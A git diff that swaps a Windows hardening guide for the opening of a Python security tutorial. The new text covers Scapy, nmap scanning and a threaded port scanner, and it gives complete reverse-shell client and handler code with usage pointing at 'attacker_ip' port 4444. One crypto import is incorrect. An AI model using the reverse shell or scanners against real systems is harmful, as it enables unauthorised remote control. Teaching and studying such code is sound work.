@@ -1,716 +1,1195 @@
-# Windows Security & Hardening Guide
+# Python for Security Guide
 
-[![Windows Security](https://img.shields.io/badge/Windows-Security-blue?style=for-the-badge&logo=windows)](https://github.com/gotr00t0day)
-[![Hardening](https://img.shields.io/badge/System-Hardening-red?style=for-the-badge&logo=shield)](https://www.microsoft.com/security)
-[![Enterprise](https://img.shields.io/badge/Enterprise-Grade-yellow?style=for-the-badge&logo=microsoft)](https://docs.microsoft.com/en-us/windows/)
+[![Python](https://img.shields.io/badge/Python-Security-blue?style=for-the-badge&logo=python)](https://github.com/gotr00t0day)
+[![Cybersecurity](https://img.shields.io/badge/Cyber-Security-red?style=for-the-badge&logo=security)](https://www.python.org)
+[![Automation](https://img.shields.io/badge/Security-Automation-green?style=for-the-badge&logo=automate)](https://pypi.org)
 
 ## Table of Contents
 
 1. [Introduction](#introduction)
-2. [Windows Security Architecture](#windows-security-architecture)
-3. [Group Policy Management](#group-policy-management)
-4. [User Account Control (UAC)](#user-account-control-uac)
-5. [Windows Firewall Configuration](#windows-firewall-configuration)
-6. [BitLocker & Drive Encryption](#bitlocker--drive-encryption)
-7. [Windows Defender Configuration](#windows-defender-configuration)
-8. [Event Logging & Monitoring](#event-logging--monitoring)
-9. [PowerShell Security](#powershell-security)
-10. [Registry Security](#registry-security)
-11. [Network Security](#network-security)
-12. [Application Security](#application-security)
-13. [Compliance & Benchmarks](#compliance--benchmarks)
-14. [Security Tools & Scripts](#security-tools--scripts)
-15. [Incident Response](#incident-response)
+2. [Python Security Libraries](#python-security-libraries)
+3. [Network Programming & Sockets](#network-programming--sockets)
+4. [Web Scraping & Automation](#web-scraping--automation)
+5. [Cryptography & Hashing](#cryptography--hashing)
+6. [Exploit Development Basics](#exploit-development-basics)
+7. [API Security Testing](#api-security-testing)
+8. [Database Security Scripts](#database-security-scripts)
+9. [Log Analysis & Parsing](#log-analysis--parsing)
+10. [Custom Security Tools](#custom-security-tools)
+11. [Malware Analysis Scripts](#malware-analysis-scripts)
+12. [Network Security Monitoring](#network-security-monitoring)
+13. [Penetration Testing Frameworks](#penetration-testing-frameworks)
+14. [Security Automation](#security-automation)
+15. [Best Practices](#best-practices)
 16. [Resources](#resources)
 
 ---
 
 ## Introduction
 
-Windows Security & Hardening is a comprehensive approach to securing Windows environments against modern threats. This guide covers essential security configurations, best practices, and advanced hardening techniques for Windows systems.
+Python has become the de facto standard for cybersecurity professionals due to its simplicity, extensive libraries, and powerful capabilities. This guide covers essential Python programming techniques and libraries specifically tailored for security applications.
 
-### Key Objectives
-- **Reduce Attack Surface**: Minimize potential entry points for attackers
-- **Implement Defense in Depth**: Multiple layers of security controls
-- **Enable Monitoring**: Comprehensive logging and detection capabilities
-- **Maintain Compliance**: Meet regulatory and industry standards
-
----
-
-## Windows Security Architecture
-
-### Windows Security Components
-
-#### Windows Security Stack
-```
-Application Layer
-├── User Mode
-│   ├── Win32 API
-│   ├── .NET Framework
-│   └── Universal Windows Platform (UWP)
-├── Kernel Mode
-│   ├── Windows Executive
-│   ├── Windows Kernel
-│   └── Hardware Abstraction Layer (HAL)
-└── Hardware Layer
-```
-
-#### Security Subsystems
-- **Local Security Authority (LSA)**: Authentication and authorization
-- **Security Account Manager (SAM)**: User account database
-- **Windows Security Center**: Centralized security management
-- **Windows Defender**: Real-time protection and scanning
-
-### Windows Security Features
-
-#### Built-in Security Technologies
-```powershell
-# Check Windows Security features
-Get-WindowsFeature | Where-Object {$_.Name -like "*Security*"}
-
-# View security policies
-secedit /export /cfg C:\SecurityBaseline.inf
-
-# Check BitLocker status
-manage-bde -status
-```
+### Why Python for Security?
+- **Rapid Development**: Quick prototyping and deployment
+- **Extensive Libraries**: Rich ecosystem of security-focused packages
+- **Cross-Platform**: Works on Windows, Linux, and macOS
+- **Active Community**: Strong support and continuous development
+- **Integration**: Easy integration with existing security tools
 
 ---
 
-## Group Policy Management
+## Python Security Libraries
 
-### Essential Security Policies
+### Essential Security Libraries
 
-#### Account Policies
-```powershell
-# Password Policy
-Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy
+#### Installation Commands
+```bash
+# Core security libraries
+pip install scapy requests beautifulsoup4 pycryptodome
+pip install nmap-python python-nmap
+pip install paramiko fabric
+pip install sqlalchemy psycopg2-binary pymongo
+pip install flask django fastapi
+pip install selenium pandas numpy matplotlib
 
-# Account Lockout Policy
-Computer Configuration\Windows Settings\Security Settings\Account Policies\Account Lockout Policy
-
-# Kerberos Policy
-Computer Configuration\Windows Settings\Security Settings\Account Policies\Kerberos Policy
+# Advanced security tools
+pip install volatility3 yara-python
+pip install pefile python-magic
+pip install impacket bloodhound
 ```
 
-#### Security Options
-```powershell
-# Interactive logon settings
-Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options
+#### Library Overview
+```python
+# Essential imports for security scripts
+import socket
+import sys
+import threading
+import subprocess
+import hashlib
+import hmac
+import base64
+import json
+import requests
+import urllib.parse
+from datetime import datetime
+import logging
+import argparse
+import os
+import re
 
-# Network access controls
-Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options
-
-# System settings
-Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options
+# Security-specific libraries
+import scapy.all as scapy
+import nmap
+import paramiko
+from Crypto.Cipher import AES, RSA
+from Crypto.Hash import SHA256
+from Crypto.Random import get_random_bytes
 ```
 
-### Group Policy Security Templates
-
-#### Security Baseline Template
-```ini
-[System Access]
-MinimumPasswordAge = 1
-MaximumPasswordAge = 90
-MinimumPasswordLength = 12
-PasswordComplexity = 1
-PasswordHistorySize = 12
-LockoutBadCount = 5
-LockoutDuration = 30
-ResetLockoutCount = 30
-
-[Registry Values]
-MACHINE\System\CurrentControlSet\Control\Lsa\RestrictAnonymous=4,1
-MACHINE\System\CurrentControlSet\Control\Lsa\RestrictAnonymousSAM=4,1
-MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
-```
-
-### PowerShell Group Policy Management
-```powershell
-# Import Group Policy module
-Import-Module GroupPolicy
-
-# Create new GPO
-New-GPO -Name "Security Baseline" -Comment "Corporate security hardening"
-
-# Link GPO to OU
-New-GPLink -Name "Security Baseline" -Target "OU=Servers,DC=company,DC=com"
-
-# Generate GPO report
-Get-GPOReport -Name "Security Baseline" -ReportType HTML -Path "C:\Reports\GPO-Report.html"
-```
-
----
-
-## User Account Control (UAC)
-
-### UAC Configuration
-
-#### UAC Registry Settings
-```powershell
-# Enable UAC
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1
-
-# UAC Admin Approval Mode
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "FilterAdministratorToken" -Value 1
-
-# UAC Elevation Prompt
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 2
-
-# UAC Secure Desktop
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 1
-```
-
-#### UAC Bypass Prevention
-```powershell
-# Disable UAC bypass techniques
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableInstallerDetection" -Value 1
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableSecureUIAPaths" -Value 1
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableVirtualization" -Value 1
-```
-
-### UAC Monitoring
-```powershell
-# Monitor UAC events
-Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4648,4672} | Format-Table TimeCreated, ID, LevelDisplayName, Message -AutoSize
-
-# UAC elevation events
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-UAC/Operational'} | Select-Object TimeCreated, Id, LevelDisplayName, Message
-```
-
----
-
-## Windows Firewall Configuration
-
-### Windows Firewall with Advanced Security
-
-#### Basic Firewall Configuration
-```powershell
-# Enable Windows Firewall for all profiles
-Set-NetFirewallProfile -All -Enabled True
-
-# Set default actions
-Set-NetFirewallProfile -Profile Domain -DefaultInboundAction Block -DefaultOutboundAction Allow
-Set-NetFirewallProfile -Profile Private -DefaultInboundAction Block -DefaultOutboundAction Allow
-Set-NetFirewallProfile -Profile Public -DefaultInboundAction Block -DefaultOutboundAction Allow
-
-# Enable logging
-Set-NetFirewallProfile -All -LogAllowed True -LogBlocked True -LogMaxSizeKilobytes 10240
-```
-
-#### Advanced Firewall Rules
-```powershell
-# Create inbound rule for specific application
-New-NetFirewallRule -DisplayName "Allow SQL Server" -Direction Inbound -Protocol TCP -LocalPort 1433 -Action Allow
-
-# Create outbound rule with specific criteria
-New-NetFirewallRule -DisplayName "Block Outbound Telnet" -Direction Outbound -Protocol TCP -RemotePort 23 -Action Block
-
-# Create rule for specific IP range
-New-NetFirewallRule -DisplayName "Allow Management Network" -Direction Inbound -Protocol Any -RemoteAddress 192.168.1.0/24 -Action Allow
-```
-
-#### IPSec Configuration
-```powershell
-# Create IPSec policy
-New-NetIPsecPolicy -DisplayName "Domain Isolation" -Description "Require authentication for domain traffic"
-
-# Create IPSec rule
-New-NetIPsecRule -DisplayName "Require Auth" -InboundSecurity Require -OutboundSecurity Require -Protocol TCP -LocalPort 445
-```
-
-### Network Segmentation
-```powershell
-# Create VLAN-based rules
-New-NetFirewallRule -DisplayName "DMZ Access" -Direction Inbound -RemoteAddress 10.0.1.0/24 -LocalAddress 10.0.2.0/24 -Action Allow
-
-# Limit administrative access
-New-NetFirewallRule -DisplayName "Admin Access" -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 192.168.100.0/24 -Action Allow
-```
-
----
-
-## BitLocker & Drive Encryption
-
-### BitLocker Configuration
-
-#### Enable BitLocker
-```powershell
-# Check BitLocker capability
-Get-WmiObject -Class Win32_EncryptableVolume -Namespace Root\CIMv2\Security\MicrosoftVolumeEncryption
-
-# Enable BitLocker on C: drive
-Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 -UsedSpaceOnly
-
-# Enable BitLocker with TPM
-Enable-BitLocker -MountPoint "C:" -TpmProtector
-
-# Enable BitLocker with password
-Enable-BitLocker -MountPoint "C:" -PasswordProtector -Password (ConvertTo-SecureString "ComplexPassword123!" -AsPlainText -Force)
-```
-
-#### BitLocker Management
-```powershell
-# Check BitLocker status
-Get-BitLockerVolume
-
-# Add recovery key protector
-Add-BitLockerKeyProtector -MountPoint "C:" -RecoveryKeyProtector
-
-# Backup recovery key to AD
-Backup-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId $RecoveryKeyProtectorId
-```
-
-### BitLocker Group Policy
-```powershell
-# Configure BitLocker via Group Policy
-Computer Configuration\Administrative Templates\Windows Components\BitLocker Drive Encryption
-
-# Key policies:
-# - Require additional authentication at startup
-# - Choose drive encryption method and cipher strength
-# - Configure use of hardware-based encryption
-```
-
----
-
-## Windows Defender Configuration
-
-### Windows Defender Antivirus
-
-#### Basic Configuration
-```powershell
-# Check Windows Defender status
-Get-MpComputerStatus
-
-# Update definitions
-Update-MpSignature
-
-# Run full system scan
-Start-MpScan -ScanType FullScan
-
-# Configure real-time protection
-Set-MpPreference -DisableRealtimeMonitoring $false
-Set-MpPreference -DisableBehaviorMonitoring $false
-Set-MpPreference -DisableIOAVProtection $false
-```
-
-#### Advanced Threat Protection
-```powershell
-# Enable cloud protection
-Set-MpPreference -MAPSReporting Advanced
-Set-MpPreference -SubmitSamplesConsent SendAllSamples
-
-# Configure attack surface reduction
-Set-MpPreference -AttackSurfaceReductionRules_Ids "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" -AttackSurfaceReductionRules_Actions Enabled
-
-# Enable controlled folder access
-Set-MpPreference -EnableControlledFolderAccess Enabled
-```
-
-### Windows Defender Firewall
-```powershell
-# Advanced firewall configuration
-Set-NetFirewallSetting -Profile Domain,Private,Public -PolicyStore ActiveStore -LogAllowed True -LogBlocked True
-
-# Enable stealth mode
-Set-NetFirewallSetting -Profile Public -PolicyStore ActiveStore -DefaultInboundAction Block -DefaultOutboundAction Allow
-```
-
----
-
-## Event Logging & Monitoring
-
-### Windows Event Logging
-
-#### Event Log Configuration
-```powershell
-# Configure Security event log
-wevtutil sl Security /ms:1024000000
-wevtutil sl Security /rt:true
-
-# Configure System event log
-wevtutil sl System /ms:512000000
-
-# Configure Application event log
-wevtutil sl Application /ms:512000000
-
-# Enable PowerShell logging
-wevtutil sl Microsoft-Windows-PowerShell/Operational /e:true
-```
-
-#### Advanced Event Logging
-```powershell
-# Enable process creation logging
-auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
-
-# Enable logon/logoff logging
-auditpol /set /subcategory:"Logon" /success:enable /failure:enable
-auditpol /set /subcategory:"Logoff" /success:enable
-
-# Enable privilege use logging
-auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
-```
-
-### Security Monitoring Scripts
-
-#### Log Analysis PowerShell
-```powershell
-# Monitor failed logon attempts
-Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | 
-Select-Object TimeCreated, @{Name='Username';Expression={$_.Properties[5].Value}}, @{Name='IP';Expression={$_.Properties[19].Value}} |
-Group-Object Username | Where-Object Count -gt 5
-
-# Monitor privilege escalation
-Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4672} | 
-Select-Object TimeCreated, @{Name='Username';Expression={$_.Properties[1].Value}}
-
-# Monitor process creation
-Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | 
-Select-Object TimeCreated, @{Name='Process';Expression={$_.Properties[5].Value}}, @{Name='CommandLine';Expression={$_.Properties[8].Value}}
-```
-
----
-
-## PowerShell Security
-
-### PowerShell Execution Policy
-
-#### Configure Execution Policy
-```powershell
-# Check current execution policy
-Get-ExecutionPolicy -List
-
-# Set execution policy for current user
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
-
-# Set execution policy for local machine
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
-```
-
-### PowerShell Logging
-
-#### Enable PowerShell Logging
-```powershell
-# Enable script block logging
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
-
-# Enable module logging
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
-
-# Enable transcription
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscription" -Value 1
-```
-
-### PowerShell Constrained Language Mode
-```powershell
-# Enable constrained language mode
-$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
-
-# Check current language mode
-$ExecutionContext.SessionState.LanguageMode
-```
-
----
-
-## Registry Security
-
-### Registry Hardening
-
-#### Disable Unnecessary Services
-```powershell
-# Disable Remote Registry
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\RemoteRegistry" -Name "Start" -Value 4
-
-# Disable Server service (if not needed)
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer" -Name "Start" -Value 4
-
-# Disable Workstation service (if not needed)
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation" -Name "Start" -Value 4
-```
-
-#### Security Settings
-```powershell
-# Disable SMBv1
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Value 0
-
-# Enable SMB signing
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
-
-# Disable LLMNR
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0
-```
-
-### Registry Monitoring
-```powershell
-# Monitor registry changes
-Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4657} | 
-Select-Object TimeCreated, @{Name='Process';Expression={$_.Properties[6].Value}}, @{Name='Key';Expression={$_.Properties[7].Value}}
-
-# Monitor specific registry keys
-Register-WmiEvent -Query "SELECT * FROM RegistryKeyChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND KeyPath='SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'" -Action {Write-Host "Registry key modified!"}
-```
-
----
-
-## Network Security
-
-### Network Hardening
-
-#### Disable Unnecessary Protocols
-```powershell
-# Disable NetBIOS over TCP/IP
-wmic nicconfig where TcpipNetbiosOptions=0 call SetTcpipNetbios 2
-
-# Disable IPv6 (if not needed)
-netsh interface ipv6 set global randomizeidentifiers=disabled
-netsh interface ipv6 set privacy state=disabled
-```
-
-#### Network Security Settings
-```powershell
-# Enable Windows Firewall logging
-netsh advfirewall set allprofiles logging filename "%systemroot%\system32\LogFiles\Firewall\pfirewall.log"
-netsh advfirewall set allprofiles logging maxfilesize 4096
-netsh advfirewall set allprofiles logging droppedconnections enable
-
-# Configure network authentication
-netsh wlan set profileparameter name="WiFi-Network" authenticationMode=WPA2PSK encryptionMode=AES
-```
-
-### Network Monitoring
-```powershell
-# Monitor network connections
-Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | 
-Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
-
-# Monitor DNS queries
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DNS-Client/Operational'} | 
-Select-Object TimeCreated, @{Name='Query';Expression={$_.Properties[0].Value}}
-```
-
----
-
-## Application Security
-
-### Application Control
-
-#### AppLocker Configuration
-```powershell
-# Configure AppLocker policies
-Set-AppLockerPolicy -XMLPolicy C:\AppLockerPolicy.xml
-
-# Create AppLocker rule
-New-AppLockerPolicy -RuleType Publisher -RuleNamePrefix "Adobe" -Publisher "O=ADOBE SYSTEMS INCORPORATED*" -Action Allow
-```
-
-#### Software Restriction Policies
-```powershell
-# Configure SRP via Group Policy
-Computer Configuration\Windows Settings\Security Settings\Software Restriction Policies
-
-# Default security level: Disallowed
-# Trusted Publishers: Specify approved software publishers
-# Path Rules: Allow specific directories
-```
-
-### Application Hardening
-
-#### Internet Explorer Security
-```powershell
-# Configure IE security zones
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1400" -Value 1
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1001" -Value 1
-```
-
-#### Office Security
-```powershell
-# Disable Office macros
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Office\16.0\Word\Security" -Name "VBAWarnings" -Value 4
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value 4
-```
-
----
-
-## Compliance & Benchmarks
-
-### Security Frameworks
-
-#### CIS Controls Implementation
-```powershell
-# CIS Control 1: Inventory and Control of Hardware Assets
-Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name, Manufacturer, Model, TotalPhysicalMemory
-
-# CIS Control 2: Inventory and Control of Software Assets
-Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor
-
-# CIS Control 3: Continuous Vulnerability Management
-Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
-```
-
-#### NIST Cybersecurity Framework
-```powershell
-# Identify: Asset inventory and risk assessment
-Get-WmiObject -Class Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, State, StartMode
-
-# Protect: Access control and data security
-Get-LocalUser | Select-Object Name, Enabled, PasswordRequired, PasswordLastSet
-
-# Detect: Continuous monitoring
-Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=(Get-Date).AddDays(-1)} | Measure-Object
-```
-
-### Compliance Reporting
-```powershell
-# Security compliance report
-function Get-SecurityComplianceReport {
-    $Report = @{
-        'BitLocker Status' = (Get-BitLockerVolume).VolumeStatus
-        'Windows Defender Status' = (Get-MpComputerStatus).AntivirusEnabled
-        'Firewall Status' = (Get-NetFirewallProfile).Enabled
-        'UAC Status' = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA
-        'Auto Update Status' = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update").AUOptions
-    }
-    return $Report
-}
-```
-
----
-
-## Security Tools & Scripts
-
-### System Hardening Script
-```powershell
-# Windows Security Hardening Script
-function Invoke-WindowsHardening {
-    Write-Host "Starting Windows Security Hardening..."
+### Network Security Libraries
+
+#### Scapy - Packet Manipulation
+```python
+from scapy.all import *
+
+# Basic packet creation
+packet = IP(dst="192.168.1.1")/TCP(dport=80)
+send(packet)
+
+# Packet sniffing
+def packet_handler(packet):
+    if packet.haslayer(TCP):
+        print(f"TCP Packet: {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")
+
+sniff(filter="tcp", prn=packet_handler, count=10)
+
+# ARP scanning
+def arp_scan(network):
+    arp_request = ARP(pdst=network)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
     
-    # Enable UAC
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 1
-    
-    # Enable Windows Defender
-    Set-MpPreference -DisableRealtimeMonitoring $false
-    
-    # Enable Windows Firewall
-    Set-NetFirewallProfile -All -Enabled True
-    
-    # Disable unnecessary services
-    Stop-Service -Name "RemoteRegistry" -Force
-    Set-Service -Name "RemoteRegistry" -StartupType Disabled
-    
-    # Configure audit policies
-    auditpol /set /subcategory:"Logon" /success:enable /failure:enable
-    auditpol /set /subcategory:"Process Creation" /success:enable
-    
-    Write-Host "Windows Security Hardening Complete!"
-}
+    clients = []
+    for element in answered_list:
+        client = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        clients.append(client)
+    return clients
+
+# Usage
+network = "192.168.1.0/24"
+clients = arp_scan(network)
+for client in clients:
+    print(f"IP: {client['ip']}, MAC: {client['mac']}")
 ```
 
-### Security Assessment Script
-```powershell
-# Security Assessment Script
-function Invoke-SecurityAssessment {
-    $Assessment = @{}
+#### Nmap Integration
+```python
+import nmap
+
+class NetworkScanner:
+    def __init__(self):
+        self.nm = nmap.PortScanner()
     
-    # Check UAC status
-    $Assessment['UAC'] = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA
+    def scan_host(self, host, ports="1-1000"):
+        """Scan a single host for open ports"""
+        try:
+            result = self.nm.scan(host, ports)
+            return result
+        except Exception as e:
+            print(f"Error scanning {host}: {e}")
+            return None
     
-    # Check Windows Defender
-    $Assessment['Defender'] = (Get-MpComputerStatus).AntivirusEnabled
+    def scan_network(self, network):
+        """Discover hosts on network"""
+        try:
+            result = self.nm.scan(hosts=network, arguments='-sn')
+            hosts = []
+            for host in self.nm.all_hosts():
+                if self.nm[host].state() == 'up':
+                    hosts.append(host)
+            return hosts
+        except Exception as e:
+            print(f"Error scanning network: {e}")
+            return []
     
-    # Check BitLocker
-    $Assessment['BitLocker'] = (Get-BitLockerVolume).VolumeStatus
-    
-    # Check Windows Updates
-    $Assessment['Updates'] = (Get-HotFix | Measure-Object).Count
-    
-    # Check running services
-    $Assessment['Services'] = (Get-Service | Where-Object {$_.Status -eq "Running"} | Measure-Object).Count
-    
-    return $Assessment
-}
+    def service_detection(self, host, ports="1-1000"):
+        """Detect services on open ports"""
+        try:
+            result = self.nm.scan(host, ports, arguments='-sV')
+            services = {}
+            if host in self.nm.all_hosts():
+                for port in self.nm[host]['tcp']:
+                    service = self.nm[host]['tcp'][port]
+                    services[port] = {
+                        'state': service['state'],
+                        'name': service['name'],
+                        'version': service.get('version', 'unknown')
+                    }
+            return services
+        except Exception as e:
+            print(f"Error detecting services: {e}")
+            return {}
+
+# Usage
+scanner = NetworkScanner()
+hosts = scanner.scan_network("192.168.1.0/24")
+for host in hosts:
+    services = scanner.service_detection(host, "22,80,443,3389")
+    print(f"Host: {host}")
+    for port, service in services.items():
+        print(f"  Port {port}: {service['name']} - {service['version']}")
 ```
 
 ---
 
-## Incident Response
+## Network Programming & Sockets
 
-### Incident Response Procedures
+### TCP/UDP Client and Server
 
-#### Initial Response
-```powershell
-# Collect system information
-Get-ComputerInfo | Out-File C:\IR\SystemInfo.txt
+#### TCP Port Scanner
+```python
+import socket
+import threading
+from datetime import datetime
 
-# Collect network connections
-Get-NetTCPConnection | Out-File C:\IR\NetworkConnections.txt
+class PortScanner:
+    def __init__(self, target_host):
+        self.target_host = target_host
+        self.open_ports = []
+    
+    def scan_port(self, port):
+        """Scan a single port"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((self.target_host, port))
+            if result == 0:
+                self.open_ports.append(port)
+                print(f"Port {port}: Open")
+            sock.close()
+        except socket.gaierror:
+            print(f"Hostname {self.target_host} could not be resolved")
+        except Exception as e:
+            print(f"Error scanning port {port}: {e}")
+    
+    def threaded_scan(self, start_port, end_port, num_threads=100):
+        """Multi-threaded port scanning"""
+        print(f"Starting port scan on {self.target_host}")
+        print(f"Time started: {datetime.now()}")
+        
+        def worker():
+            while True:
+                port = q.get()
+                if port is None:
+                    break
+                self.scan_port(port)
+                q.task_done()
+        
+        import queue
+        q = queue.Queue()
+        
+        # Start worker threads
+        threads = []
+        for i in range(num_threads):
+            t = threading.Thread(target=worker)
+            t.start()
+            threads.append(t)
+        
+        # Add ports to queue
+        for port in range(start_port, end_port + 1):
+            q.put(port)
+        
+        # Wait for completion
+        q.join()
+        
+        # Stop worker threads
+        for i in range(num_threads):
+            q.put(None)
+        for t in threads:
+            t.join()
+        
+        print(f"Scanning completed at: {datetime.now()}")
+        print(f"Open ports: {self.open_ports}")
 
-# Collect process information
-Get-Process | Out-File C:\IR\ProcessList.txt
-
-# Collect event logs
-Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=(Get-Date).AddDays(-7)} | Export-Csv C:\IR\SecurityLogs.csv
+# Usage
+scanner = PortScanner("192.168.1.1")
+scanner.threaded_scan(1, 1000)
 ```
 
-#### Forensic Collection
-```powershell
-# Memory dump
-Get-Process | Select-Object ProcessName, Id, WorkingSet | Sort-Object WorkingSet -Descending | Out-File C:\IR\MemoryUsage.txt
+#### TCP Reverse Shell
+```python
+import socket
+import subprocess
+import threading
 
-# Registry export
-reg export HKLM C:\IR\HKLM.reg
-reg export HKCU C:\IR\HKCU.reg
+class ReverseShell:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.sock = None
+    
+    def connect(self):
+        """Connect to the handler"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.connect((self.host, self.port))
+            return True
+        except Exception as e:
+            print(f"Connection failed: {e}")
+            return False
+    
+    def execute_command(self, command):
+        """Execute system command"""
+        try:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+            return output.decode('utf-8')
+        except subprocess.CalledProcessError as e:
+            return f"Error: {e.output.decode('utf-8')}"
+        except Exception as e:
+            return f"Error: {str(e)}"
+    
+    def start_shell(self):
+        """Start the reverse shell"""
+        if not self.connect():
+            return
+        
+        try:
+            while True:
+                command = self.sock.recv(1024).decode('utf-8')
+                if command.lower() == 'exit':
+                    break
+                
+                if command.startswith('cd '):
+                    try:
+                        os.chdir(command[3:])
+                        self.sock.send(b"Directory changed\n")
+                    except Exception as e:
+                        self.sock.send(f"Error: {str(e)}\n".encode())
+                else:
+                    output = self.execute_command(command)
+                    self.sock.send(output.encode())
+        except Exception as e:
+            print(f"Shell error: {e}")
+        finally:
+            self.sock.close()
 
-# File system timeline
-Get-ChildItem C:\Windows\System32 -Recurse | Select-Object Name, CreationTime, LastWriteTime | Out-File C:\IR\FileTimeline.txt
+# Handler script (run on attacker machine)
+class ShellHandler:
+    def __init__(self, port):
+        self.port = port
+        self.sock = None
+    
+    def start_listener(self):
+        """Start listening for reverse shell connections"""
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.bind(('0.0.0.0', self.port))
+            self.sock.listen(5)
+            print(f"Listening on port {self.port}...")
+            
+            while True:
+                client_sock, addr = self.sock.accept()
+                print(f"Connection from {addr}")
+                self.handle_client(client_sock)
+        except Exception as e:
+            print(f"Handler error: {e}")
+    
+    def handle_client(self, client_sock):
+        """Handle client shell session"""
+        try:
+            while True:
+                command = input("Shell> ")
+                if command.lower() == 'exit':
+                    client_sock.send(b'exit')
+                    break
+                
+                client_sock.send(command.encode())
+                response = client_sock.recv(4096).decode('utf-8')
+                print(response)
+        except Exception as e:
+            print(f"Client handling error: {e}")
+        finally:
+            client_sock.close()
+
+# Usage examples (for educational purposes only)
+# Victim machine:
+# shell = ReverseShell("attacker_ip", 4444)
+# shell.start_shell()
+
+# Attacker machine:
+# handler = ShellHandler(4444)
+# handler.start_listener()
 ```
 
-### Containment Procedures
-```powershell
-# Network isolation
-New-NetFirewallRule -DisplayName "Block All Outbound" -Direction Outbound -Action Block
+---
 
-# Process termination
-Stop-Process -Name "malicious_process" -Force
+## Web Scraping & Automation
 
-# Service stopping
